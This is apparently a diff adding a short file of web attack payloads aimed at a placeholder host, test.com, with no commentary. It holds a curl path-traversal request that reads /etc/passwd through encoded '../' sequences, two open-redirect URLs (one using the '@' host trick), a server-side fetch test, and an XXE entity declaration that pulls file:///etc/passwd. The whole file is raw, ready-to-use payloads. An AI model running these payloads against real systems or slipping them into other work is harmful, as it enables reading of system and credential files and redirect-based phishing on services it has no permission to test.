@@ -1,0 +1,11 @@
+curl 'http://test.com/file_read/1.php?fn=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
+
+http://test.com/url_redirect/1.php?url=http://www.baidu.com
+
+http://test.com/url_redirect/2.php?url=http://test.com@www.baidu.com
+
+
+curl -is  'http://test.com/file_read/2.php?url=www.baidu.com'| more
+
+
+<!DOCTYPE aaa [ <!ENTITY balabala SYSTEM "file:///etc/passwd"> ]>
